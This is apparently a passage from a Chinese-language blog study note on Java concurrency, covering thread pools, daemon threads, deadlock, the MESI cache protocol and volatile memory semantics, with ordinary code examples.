<p>当一个线程调用<code>sleep()</code>方法时，它会使线程进入阻塞状态一段时间，但该线程仍然保有它已经获得的所有锁。这意味着如果一个线程在进入<code>sleep()</code>之前获得了一个锁，那么它在<code>sleep()</code>期间仍然会保持这个锁，其他线程无法获得这个锁。</p>
<p>这与线程的<code>wait()</code>方法不同。当一个线程调用<code>wait()</code>方法时，它会释放它在相应对象上的锁，允许其他线程获得这个锁。</p>
<p>这是因为<code>sleep()</code>和<code>wait()</code>方法的设计目标不同：<code>sleep()</code>方法主要用于让线程暂停一段时间，而<code>wait()</code>方法主要用于实现线程间的同步。所以，在编写多线程程序时，需要根据实际的需求和情况选择合适的方法。</p>
<h3 id="interrupt"><a href="#interrupt" class="headerlink" title="interrupt"></a>interrupt</h3><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><h3 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h3><h3 id="daemon"><a href="#daemon" class="headerlink" title="daemon"></a>daemon</h3><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h2 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h2><h2 id="用户线程和守护线程"><a href="#用户线程和守护线程" class="headerlink" title="用户线程和守护线程"></a>用户线程和守护线程</h2><ol>
<li><p>用户线程</p>
<p>默认情况下主线程和创建的新线程、新线程池都为用户线程</p>
<p>以线程为例，想要查看线程是否为守护线程只需通过调用 <code>isDaemon()</code> 方法查询即可，如果查询的值为 <code>false</code> 则表示不为守护线程。</p>
</li>
<li><p>守护线程</p>
<p>守护线程（Daemon Thread）也被称之为后台线程或服务线程，当程序中的用户线程全部执行结束之后，守护线程也会跟随结束。</p>
<p>JVM中的垃圾回收线程、JIT编译线程都是守护线程</p>
<p>守护线程可以按来源分两种：</p>
<ul>
<li><p>JVM中带有的守护线程</p>
</li>
<li><p>将默认的用户线程修改为守护线程</p>
<ul>
<li>如果是线程，则可以通过设置 <code>setDaemon(true)</code> 方法将用户线程直接修改为守护线程</li>
<li>如果是线程池则需要通过 <code>ThreadFactory</code> 将线程池中的每个线程都为守护线程才行，接下来我们分别来实现一下</li>
</ul>
</li>
</ul>
</li>
</ol>
<h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><h2 id="线程池的状态"><a href="#线程池的状态" class="headerlink" title="线程池的状态"></a>线程池的状态</h2><p>线程池在运行过程中涉及的状态包括RUNNING、SHUTDOWN、STOP、TIDYING、TERMINATED</p>
<p>RUNNING：表示线程池处在运行状态，能处理正在执行的任务，能处理阻塞队列中的任务，能够接收新提交的任务。</p>
<p>SHUTDOWN：表示线程池处在关闭状态，能处理正在执行的任务，能处理阻塞队列中的任务，但是不能接收新提交的任务。如果线程池处于RUNNING状态，此时调用shutdown()方法会使线程进入SHUTDOWN状态。</p>
<p>STOP：表示线程池处于停止状态，线程会中断正在执行的任务，不能处理阻塞队列中的任务，也不能接收新提交的任务。如果线程池处于RUNNING或者SHUTDOWN状态，那么调用线程池的shutdownNow()方法会使线程池进入STOP状态。</p>
<p>TIDYING：如果线程池中已经没有正在执行的任务，并且线程池的阻塞队列为空，线程池就会进入TIDYING状态。当线程池处于SHUTDOWN或者STOP状态时，如果满足TIDYING状态的条件，线程池就会进入TIDYING状态。</p>
<p>TERMINATED：如果线程池处于TIDYING状态，此时调用线程池的terminated方法，线程池就会进入TERMINATED状态。</p>
<h2 id="线程池的创建方式"><a href="#线程池的创建方式" class="headerlink" title="线程池的创建方式"></a>线程池的创建方式</h2><p>Java中线程池的创建有四个类可以实现，分别是Executors、ThreadPoolExecutor、ForkJoinPool、ScheduledThreadPoolExecutor。</p>
<ol>
<li><p>使用Executors类创建线程池</p>
<p>Executors 提供了一些静态工厂方法来创建不同类型的线程池，包括newFixedThreadPool、newWorkStealingPool、newCachedThreadPool、newScheduledThreadPool、newSingleThreadExecutor、newSingleThreadScheduledExecutor等。这种方式适用于简单的场景，但缺少可定制性，无法精细调整线程池的参数。其中newWorkStealingPool是JDK1.8新增的方法，表示创建一个具有并行级别的线程池，比Executors类中断其它方法创建的线程池有更高的并发性能。</p>
<p>在Executors类中，newFixedThreadPool、newCachedThreadPool和newSingleThreadExecutor都是调用ThreadPoolExecutor类的构造方法实现的。所以《阿里巴巴Java开发手册》推荐直接调用ThreadPoolExecutor类的构造方法创建线程。</p>
<p>newWorkStealingPool是调用ForkJoinPool类的构造方法实现的。</p>
<p>newScheduledThreadPool和newSingleThreadScheduledExecutor是调用ScheduledThreadPoolExecutor类的构造方法实现的。</p>
<p>Executors类的使用示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建一个固定大小的线程池</span><br><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>使用ThreadPoolExecutor类创建线程池</p>
<p>使用 ThreadPoolExecutor 构造函数手动创建线程池，可以自定义线程池的参数，参数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ThreadPoolExecutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, //线程池的核心线程数</span><br><span class="hljs-params">                              <span class="hljs-type">int</span> maximumPoolSize, //最大线程数</span><br><span class="hljs-params">                              <span class="hljs-type">long</span> keepAliveTime, //空闲线程存活时间</span><br><span class="hljs-params">                              TimeUnit unit, //空闲线程存活时间单位</span><br><span class="hljs-params">                              BlockingQueue&lt;Runnable&gt; workQueue, //阻塞队列</span><br><span class="hljs-params">                              ThreadFactory threadFactory, // 用来创建线程的线程工厂</span><br><span class="hljs-params">                              RejectedExecutionHandler handler)</span> <span class="hljs-comment">//拒绝处理任务时的策略</span><br></code></pre></td></tr></table></figure>

<ol>
<li>当线程池中的线程数小于corePoolSize，即使存在空闲线程，也会创建新的线程。</li>
<li>当线程池中的线程数大于corePoolSize，小于maximunPoolSize，那么只有当workQueue队列已满时才会创建新线程来执行任务。</li>
<li>如果线程池中运行的线程数等于maximunPoolSize，并且workQueue队列已满，就会触发拒绝处理任务时的策略（handler）来拒绝任务的执行。</li>
</ol>
<p>ThreadPoolExecutor类的使用示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 手动创建 ThreadPoolExecutor 对象</span><br><span class="hljs-comment">// 除ArrayBlockingQueue外还有LinkedBlockingQueue</span><br>BlockingQueue&lt;Runnable&gt; workQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>); <br><span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS, workQueue);<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(nThreads, nThreads,<br>                                      <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS,<br>                                      <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;());<br></code></pre></td></tr></table></figure>
</li>
<li><p>使用ForkJoinPool类创建线程池</p>
<blockquote>
<p>维基百科为工作窃取的介绍：</p>
<p>在并行计算中，工作窃取是多线程计算机程序的一种调度策略。它解决了在具有固定数量处理器（或内核）的静态多线程计算机上执行动态多线程计算的问题，这种计算可以“生成”新的执行线程。它在执行时间、内存使用和处理器间通信方面都很有效。</p>
</blockquote>
<p>从JDK1.8开始，Java增加了创建work-stealing（工作窃取）线程池的方法，ForkJoinPool类就是提供了创建work-stealing线程池的实现。</p>
<p>使用 ThreadPoolExecutor 构造函数手动创建线程池，可以自定义的线程池参数如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">ForkJoinPool</span><span class="hljs-params">(<span class="hljs-type">int</span> parallelism, //线程池的并发级别</span><br><span class="hljs-params">                         ForkJoinWorkerThreadFactory factory, //用来创建线程的线程工厂</span><br><span class="hljs-params">                         UncaughtExceptionHandler handler, // 执行任务时遇到不可恢复的错误而终止的内部工作线程的处理程序</span><br><span class="hljs-params">                         <span class="hljs-type">int</span> mode, //处理任务队列的模式，取值可为FIFO_QUEUE或LIFO_QUEUE</span><br><span class="hljs-params">                         String workerNamePrefix)</span> <span class="hljs-comment">//表示线程池中执行任务的线程的名称前缀</span><br></code></pre></td></tr></table></figure>

<p>ForkJoinPool类的使用示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ForkJoinPool</span>();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ForkJoinPool</span>(Runtime.getRuntime().availableProcessors());<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ForkJoinPool</span>(Runtime.getRuntime().availableProcessors(), <br>                 ForkJoinPool.defaultForkJoinWorkerThreadFactory, <br>                 <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>.UncaughtExceptionHandler()&#123;<br>	<span class="hljs-meta">@Override</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uncaughtException</span><span class="hljs-params">(Thread t, Throwable e)</span> &#123;<br>		<span class="hljs-comment">//处理异常</span><br>	&#125;<br>&#125;, <span class="hljs-literal">true</span>);  <br></code></pre></td></tr></table></figure>
</li>
<li><p>使用ScheduledThreadPoolExecutor类创建线程池</p>
<p>ScheduledThreadPoolExecutor类用于创建定时任务线程池。ScheduledThreadPoolExecutor继承了ThreadPoolExecutor类，本质上ScheduledThreadPoolExecutor类的构造方法还是调用了ThreadPoolExecutor类的构造方法，只不过在调用时，传递的阻塞队列的类型是DelayedWorkQueue。</p>
</li>
</ol>
<h2 id="线程池执行任务的流程"><a href="#线程池执行任务的流程" class="headerlink" title="线程池执行任务的流程"></a>线程池执行任务的流程</h2><p>以ThreadPoolExecutor为例，线程池的任务执行流程是：</p>
<ol>
<li>对于提交到线程池的任务，首先会判断线程池中的线程数是否达到corePoolSize<ol>
<li>如果没有达到，就创建新的线程执行任务</li>
<li>如果达到了，就判断workQueue是否已满<ol>
<li>如果没满，就添加到workQueue</li>
<li>如果满了，就判断线程池中的线程数是否达到maximunPoolSize<ol>
<li>如果没有达到，就创建新线程来执行任务</li>
<li>如果达到了，就执行拒绝执行策略</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="线程池的拒绝策略"><a href="#线程池的拒绝策略" class="headerlink" title="线程池的拒绝策略"></a>线程池的拒绝策略</h2><p>以ThreadPoolExecutor为例，如果线程池中的线程数达到了maximunPoolSize，并且workQueue已满，没有空闲的线程，此时如果有任务提交到线程池，就会执行线程池的拒绝策略处理函数handler.rejectedExecution(command, this)。</p>
<p>ThreadPoolExecutor中的handler的类型是RejectedExecutionHandler。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> RejectedExecutionHandler handler;<br></code></pre></td></tr></table></figure>

<p>RejectedExecutionHandler接口有四个实现类，这四个类就是JDK提供的线程池拒绝策略的实现类，如果没有传递该handler参数指定使用的拒绝策略，则默认执行AbortPolicy类的拒绝策略，否则执行传递的类的执行策略。继承RejectedExecutionHandler可以实现自定义的拒绝策略。</p>
<img src="./Java并发编程/image-20230519215921078.png" alt="image-20230519215921078" style="zoom:80%;" />

<h2 id="线程池的关闭方式"><a href="#线程池的关闭方式" class="headerlink" title="线程池的关闭方式"></a>线程池的关闭方式</h2><p>Java 线程池的关闭方式有两种：调用 shutdown() 和 shutdownNow() 方法。</p>
<ol>
<li>调用 shutdown() 方法</li>
</ol>
<p>shutdown() 方法会平缓地关闭线程池，即不会中断正在执行的任务，能够处理完阻塞队列中已提交的任务，但不会接收新的任务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);<br><span class="hljs-comment">// 提交任务给线程池执行</span><br>...<br><span class="hljs-comment">// 关闭线程池</span><br>executor.shutdown();<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>调用 shutdownNow() 方法</li>
</ol>
<p>shutdownNow() 方法会强制立即关闭线程池，即中断所有正在执行的任务，不会处理阻塞队列中已提交的任务，更不会接收新的任务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);<br><span class="hljs-comment">// 提交任务给线程池执行</span><br>...<br><span class="hljs-comment">// 关闭线程池</span><br>executor.shutdownNow();<br></code></pre></td></tr></table></figure>

<h2 id="最佳线程数"><a href="#最佳线程数" class="headerlink" title="最佳线程数"></a>最佳线程数</h2><p>要确定线程池的最佳线程数是根据应用场景确定的，一般可以将程序分为CPU密集型程序和I&#x2F;O密集型程序，对于这两种程序，计算最佳线程数的方法是不同的。</p>
<ol>
<li><p>CPU密集型程序</p>
<p>CPU密集型程序对CPU的资源利用率高，理论最佳线程数&#x3D;CPU核心数，一般会将线程数设为CPU核心数+1，以避免有的线程阻塞浪费CPU资源</p>
</li>
<li><p>I&#x2F;O密集型程序</p>
<p>I&#x2F;O密集型程序对CPU的资源利用率低，线程数的计算需要考虑I&#x2F;O操作的CPU占用率，理论上最佳线程数&#x3D;CPU核心数 * (1 + I&#x2F;O操作的耗时&#x2F;CPU计算的耗时)</p>
</li>
</ol>
<p>通过上述方式计算出的线程数只是理论上的最佳线程数，在实际中，需要对系统进行压测，并根据压测结果确定最佳线程数。</p>
<h1 id="XXX程"><a href="#XXX程" class="headerlink" title="XXX程"></a>XXX程</h1><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><ul>
<li><p>进程：CPU分配资源的基本单位</p>
</li>
<li><p>线程：CPU执行的基本单位</p>
</li>
</ul>
<p>线程可以通俗的理解为程序不同的执行路径</p>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><h2 id="纤程"><a href="#纤程" class="headerlink" title="纤程"></a>纤程</h2><h2 id="超线程"><a href="#超线程" class="headerlink" title="超线程"></a>超线程</h2><p>超线程（Hyper-Threading）是Intel公司引入的一种处理器（CPU）技术。这项技术的主要目标是提高处理器核心的效率和性能。超线程通过使单个处理器核心模拟出两个“逻辑”核心，以便同时处理两个线程，从而提高了处理器的并行处理能力。</p>
<p>传统的单核心处理器在任何时刻只能处理一个线程。但是，由于各种原因（例如，等待数据从内存中加载），处理器可能无法始终保持忙碌状态。在这些情况下，处理器的一部分（例如，算术逻辑单元或浮点单元）可能会闲置，从而造成资源浪费。</p>
<p>超线程技术试图解决这个问题，通过在单个核心上同时运行两个线程，使得当一个线程在等待时，另一个线程可以使用处理器的资源进行计算。因此，超线程可以使处理器在相同的时间内完成更多的工作，从而提高处理器的整体效率和性能。</p>
<p>然而，超线程并不总是能提供显著的性能提升。在某些情况下，如果两个线程需要使用相同的处理器资源，那么它们可能会相互竞争，从而导致性能下降。此外，超线程对于多线程程序或多任务环境最有效，对于单线程程序或单任务环境的效果可能不明显。</p>
<p>请注意，虽然超线程可以提高处理器的并行处理能力，但它并不能取代多核处理器。多核处理器具有多个独立的物理核心，每个核心都可以处理自己的线程，因此它们通常可以提供比超线程更好的并行性和性能。</p>
<h1 id="并发编程相关的概念"><a href="#并发编程相关的概念" class="headerlink" title="并发编程相关的概念"></a>并发编程相关的概念</h1><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><ul>
<li>临界区表示可以被多线程共享的资源，但是每次只能提供给一个线程使用</li>
<li>在并发编程中，临界区指的是受保护的对象或程序代码段</li>
</ul>
<h2 id="操作系统的互斥量"><a href="#操作系统的互斥量" class="headerlink" title="操作系统的互斥量"></a>操作系统的互斥量</h2><h2 id="用户态、内核态"><a href="#用户态、内核态" class="headerlink" title="用户态、内核态"></a>用户态、内核态</h2><h2 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h2><ul>
<li>以同步方式调用方法时，必须在方法返回结果之后才能执行后面的操作</li>
<li>以异步方式调用方法时，不需要等方法返回信息就可以执行后面的操作，当方法完成后，会以通知或回调的方式告诉调用方</li>
</ul>
<h2 id="死锁、饥饿、活锁"><a href="#死锁、饥饿、活锁" class="headerlink" title="死锁、饥饿、活锁"></a>死锁、饥饿、活锁</h2><ol>
<li>死锁指两个或多个线程在执行过程中互相等待对方释放资源的情况，导致彼此无法继续执行；</li>
<li>饥饿指某个线程由于无法获得所需资源而一直无法执行；</li>
<li>活锁指两个或多个线程由于某些条件发生变化，导致彼此不断地改变自己的状态和行为，但始终无法向前推进。</li>
</ol>
<h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><h3 id="形成死锁的必要条件"><a href="#形成死锁的必要条件" class="headerlink" title="形成死锁的必要条件"></a>形成死锁的必要条件</h3><ol>
<li>互斥条件：资源只能被一个线程占有</li>
<li>不可剥夺条件：线程占有的资源不能被其他线程强行撤销</li>
<li>请求与保持条件：如果线程已经占有了一个资源，有需要抢占新资源，而该新资源已经被其它线程占有时，那么抢占新资源的线程会阻塞等待，不会释放自己已经占有的资源</li>
<li>循环等待条件：发生死锁时，必然存在一个线程与资源的循环等待链，链中的线程请求的资源被下一个线程占有</li>
</ol>
<h3 id="死锁的预防"><a href="#死锁的预防" class="headerlink" title="死锁的预防"></a>死锁的预防</h3><ol>
<li>死锁的预防是破坏死锁形成的条件，而互斥条件不能被破坏，因为使用锁的目的就是要保证这一点。</li>
<li>破坏不可剥夺条件：让当前线程主动释放锁，JVM内置的synchronized锁不能实现这一点，JDK的Lock锁可以实现。使用方法是，通过tryLock()方法加锁，并在finally代码块中调用unlock()方法释放锁。</li>
<li>破坏请求与保持条件：一次性申请线程所需的全部资源，再运行过程中不再请求新的资源。</li>
<li>破坏循环等待条件：按照一定的顺序申请资源，实现方法是为每一个资源分配一个唯一编号，每次申请资源时都按照一定的顺序加锁，比如每次都先对编号较小的资源加锁。</li>
</ol>
<h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>自旋锁是指线程在获取锁失败后，不会立即进入阻塞状态，而是继续不断尝试获取锁</p>
<h1 id="原子性、可见性、有序性"><a href="#原子性、可见性、有序性" class="headerlink" title="原子性、可见性、有序性"></a>原子性、可见性、有序性</h1><ol>
<li><p>原子性</p>
<p>原子性操作和数据库中的事务类似</p>
<p>造成原子性问题的根本原因是在线程执行过程中发生了线程切换</p>
</li>
<li><p>可见性</p>
<p>可见性是指一个线程修改共享变量，其他线程能够立即读取到共享变量的最新值</p>
<p>造成可见性问题的根本原因是CPU的缓存机制</p>
</li>
<li><p>有序性</p>
<p>有序性指程序能够按照代码的顺序执行，不会发送乱序执行</p>
<p>一个典型的有序性问题是使用双重监测机制创建单例对象（DCL单例），如果在多线程情况下创建单例对象发送乱序执行就可能产生bug</p>
</li>
</ol>
<p>解决方法：</p>
<ol>
<li>原子性：Java中解决原子性问题的方案是使用synchronized锁、Lock锁、ReentrantLock、ReentrantReadWriteLock锁、CAS操作或原子类等。</li>
<li>可见性：使用缓存一致性协议</li>
<li>有序性：禁止指令重排</li>
</ol>
<h2 id="原子性核心原理"><a href="#原子性核心原理" class="headerlink" title="原子性核心原理"></a>原子性核心原理</h2><h3 id="总线锁保证原子性"><a href="#总线锁保证原子性" class="headerlink" title="总线锁保证原子性"></a>总线锁保证原子性</h3><p>多核CPU对内存中的一个共享变量值进行加1操作不是原子操作，这是因为在CPU中对值加1的操作有三步（设被加1的数叫count）：</p>
<ol>
<li>将内存中的count值读取到寄存器。</li>
<li>对寄存器中的count值进行加1操作。</li>
<li>将寄存器中的count值写回内存。</li>
</ol>
<p>如果要保证这三步的原子性，就要保证在CPU1执行这三步的时候，其他CPU不能读写这个共享变量的内存。CPU可以通过对总线加锁来解决这个问题。</p>
<p>在Linux系统中，锁定总线的指令是lock前缀指令。该指令可以与其他指令组合使用，例如lock add、lock cmpxchg、lock xchg等，用于实现原子性操作。</p>
<p>lock前缀指令会将总线置为锁定状态，以确保对内存的访问具有原子性和互斥性。当一个CPU执行带有lock前缀的指令时，它将先发送请求到总线，获取总线的独占控制权，然后执行相关的操作并释放总线控制权。由于总线只能被一个CPU独占，因此其他CPU在访问内存时会被阻塞，直到当前CPU执行完成。</p>
<p>总线锁定会导致其他CPU核心跟所有内存之间的通信全部阻塞，开销极大，而输出LOCK#信号的CPU核心可能只需要使用内存中的很小一部分空间，会造成资源的浪费。</p>
<h3 id="互斥锁保证原子性"><a href="#互斥锁保证原子性" class="headerlink" title="互斥锁保证原子性"></a>互斥锁保证原子性</h3><p>互斥锁是一种显式地获取和释放锁的方式，当一个线程尝试获取互斥锁时，如果该锁已经被其他线程占用，那么当前线程就会被阻塞。</p>
<p>互斥锁模型：</p>
<ol>
<li>对保护临界区资源的锁对象加锁</li>
<li>进入临界区代码执行</li>
<li>对锁对象进行解锁</li>
</ol>
<h3 id="CAS保证原子性"><a href="#CAS保证原子性" class="headerlink" title="CAS保证原子性"></a>CAS保证原子性</h3><p>CAS底层使用的操作系统原语是lock cmpxchg</p>
<h2 id="可见性和有序性核心原理"><a href="#可见性和有序性核心原理" class="headerlink" title="可见性和有序性核心原理"></a>可见性和有序性核心原理</h2><h3 id="缓存一致性"><a href="#缓存一致性" class="headerlink" title="缓存一致性"></a>缓存一致性</h3><p>由于CPU的多级缓存架构，引入了数据的不一致问题</p>
<p>CPU的缓存一致性要求CPU内部缓存中的数据和主内存中的数据一致</p>
<p>缓存一致性的特点：每个读操作所返回的值必须是最后一次对该存储位置的写操作的值。</p>
<h3 id="MESI协议"><a href="#MESI协议" class="headerlink" title="MESI协议"></a>MESI协议</h3><p>CPU通过缓存一致性协议（如MESI协议、MSI协议等）来保证缓存一致性</p>
<p>MESI协议的每一个字母都是一种一种状态的简称</p>
<ul>
<li><p>M：Modify</p>
<p>处于M状态的缓存行的特点是：</p>
<ol>
<li>缓存行数据被本地写（当前CPU核心修改缓存行数据），缓存行中的数据和主内存中的数据不一致</li>
<li>数据只在当前CPU核心的缓存中存在</li>
<li>处于M状态的缓存行中的数据必须在其他CPU核心读取主内存的数据之前写回主内存</li>
<li>M状态的缓存行数据被写回主内存后，当前缓存行的状态会被标记为E</li>
</ol>
</li>
<li><p>E：Exclusive</p>
<p>处于E状态的缓存行的特点：</p>
<ol>
<li>缓存行数据未被修改过，缓存行中的数据和主内存中的数据一致，缓存行有效</li>
<li>数据只在当前CPU核心的缓存中存在</li>
<li>处于E状态的缓存行的数据如果被其他的CPU核心读取，会变成S状态</li>
<li>E状态的缓存行数据被修改后，当前缓存行的状态会被标记为M</li>
</ol>
</li>
<li><p>S：Shared</p>
<p>处于S状态的缓存行的特点是：</p>
<ol>
<li>缓存行数据未被修改过，缓存行中的数据和主内存中的数据一致，缓存行有效</li>
<li>数据存在于多个CPU核心的缓存</li>
<li>处于S状态的缓存行的数据如果发生本地写，会变成M状态</li>
<li>处于S状态的缓存行的数据如果发生远程写（其他CPU核心修改缓存行数据），会变成I状态</li>
</ol>
</li>
<li><p>I：Invalid</p>
<p>处于I状态的缓存行的特点是：</p>
<ol>
<li>处于I状态的缓存行无效</li>
<li>处于M、E或S状态的缓存行数据，如果发生远程写，则这些缓存行状态都会改为I状态</li>
</ol>
</li>
</ul>
<p>MESI存在的问题：</p>
<ol>
<li><p>MESI协议在高并发场景下可能会存在问题，原因是在MESI协议下，如果当前CPU需要其他的CPU缓存行改变状态，会发送RFO（Request For Owner）请求进行通知，请求到达其他的CPU是需要时间的，在高并发场景下状态的修改可能会不及时。</p>
</li>
<li><p>M状态的缓存行数据不会立即更新到主内存，可能会导致其他CPU缓存行中读取的数据和修改后的数据出现短暂的不一致，</p>
<p>这一问题可以通过加锁或volatile解决。</p>
</li>
<li><p>存在伪共享问题。伪共享问题产生的原因是，CPU进行缓存和主内存交换数据的单位是缓存行（目前主流CPU缓存行的大小是64bytes），MESI协议也是针对缓存行变更状态，不是单个数据的状态。一个缓存行可能会存储了多个不同数据，所以缓存行中不同数据的状态存在共享的可能（伪共享），会导致不同数据的缓存状态彼此干扰。</p>
<p>JDK8之前可以通过字节填充的方式解决伪共享问题，思路大致是在创建变量时，用其他字段填充当前变量所在的缓存行，避免同一个缓存行内存放多个数据变量。</p>
<p>JDK8中引入了@Contended注解来自动填充缓存行，@Contended注解可以用在类和成员变量上，加上@Contended注解后JVM会自动填充，避免出现伪共享问题。使用@Contended注解需要注意的问题是，@Contended只能用在Java自身的核心类中，如果要用在自己写的类里面，需要添加JVM参数<code>-XX:RestrictContended</code>，此外，@Contended默认的填充宽度是128bytes，如果需要自定义宽度需要配置JVM的<code>-XX:ContendedPaddingWidth</code>参数。</p>
</li>
</ol>
<h3 id="volatile核心原理"><a href="#volatile核心原理" class="headerlink" title="volatile核心原理"></a>volatile核心原理</h3><p>volatile在内存语义上有两个作用：</p>
<ol>
<li>保证被volatile修饰的共享变量对每个线程都是可见的（可见性）</li>
<li>禁止指令重排（有序性）</li>
</ol>
<p>volatile不支持原子性，非线程安全</p>
<h4 id="保证可见性的核心原理"><a href="#保证可见性的核心原理" class="headerlink" title="保证可见性的核心原理"></a>保证可见性的核心原理</h4><p>volatile能够保证共享变量的可见性，如果一个共享变量使用volatile修饰，则共享变量所在的缓存行会被要求进行一致性校验，当一个线程修改了volatile修饰的共享变量后，修改后的共享变量值会立即刷新到主内存（MESI协议不会立即刷新，而是等远程读或远程写才会将修改后的数据值刷新到主内存）。</p>
<h4 id="保证有序性的核心原理"><a href="#保证有序性的核心原理" class="headerlink" title="保证有序性的核心原理"></a>保证有序性的核心原理</h4><p>volatile禁止指令重排是通过内存屏障（Memory Barrier）实现的。</p>
<p>内存屏障的底层是CPU指令。这个指令有两个作用：</p>
<ul>
<li><p>强制刷新缓存，保证共享变量的可见性</p>
<p>强制刷新缓存是指将处理器的缓存中的数据立即写回到主内存。当处理器修改了某个内存地址的值时，为了确保其他处理器能够看到最新的值，处理器会将修改后的值先写入自己的缓存中，然后再定期将缓存中的数据刷新回主内存。但是有时候我们需要立即刷新缓存，以确保其他处理器能够尽快看到最新的值。这可以通过执行一个写屏障或者其他特定的指令来实现。</p>
</li>
<li><p>禁止指令重排，保证指令的执行顺序</p>
<p>处理器为了提高程序执行效率，在编译（编译器重排序）或运行（CPU重排序）时会针对代码中的语句进行优化和重排。然而，在多线程并发环境下，这种重排可能会导致一些共享变量的状态无法正确传递，从而出现数据不一致的情况。内存屏障可以禁止指令重排，确保程序执行顺序的正确性。</p>
<p>注：</p>
<ol>
<li>编译器重排序：在代码编译阶段为了提高程序的执行效率，但不改变程序执行结果的重排序。</li>
<li>CPU重排序：CPU按照as-if-serial原则进行指令级重排序和内存系统重排序。as-if-serial原则能够保证在单线程环境下程序执行的正确性，不能保证在多线程环境下程序执行结果的正确性。</li>
</ol>
</li>
</ul>
<p>volatile禁止指令重排序的规则：</p>
<table>
<thead>
<tr>
<th>是否能重排序</th>
<th>第二个操作</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>第一个操作</td>
<td>普通读或写</td>
<td>volatile读</td>
<td>volatile写</td>
</tr>
<tr>
<td>普通读或写</td>
<td>是</td>
<td>是</td>
<td><strong>否</strong></td>
</tr>
<tr>
<td>volatile写</td>
<td>是</td>
<td><strong>否</strong></td>
<td><strong>否</strong></td>
</tr>
<tr>
<td>volatile读</td>
<td><strong>否</strong></td>
<td><strong>否</strong></td>
<td><strong>否</strong></td>
</tr>
</tbody></table>
<p>可以总结出规则是：</p>
<ol>
<li>当第一个操作是volatile读，无论第二个操作是什么，都不能重排序（读操作禁止重排序之后的操作）</li>
<li>当第一个操作是volatile写，第二个操作是volatile读，不能重排序</li>
<li>当第二个操作是volatile写，无论第一个操作是什么，都不能重排序（写操作禁止重排序之前的操作）</li>
</ol>
<p>内存屏障的类型：</p>
<ul>
<li>LoadLoad屏障：禁止前面的读（Load）和后面的Load重排</li>
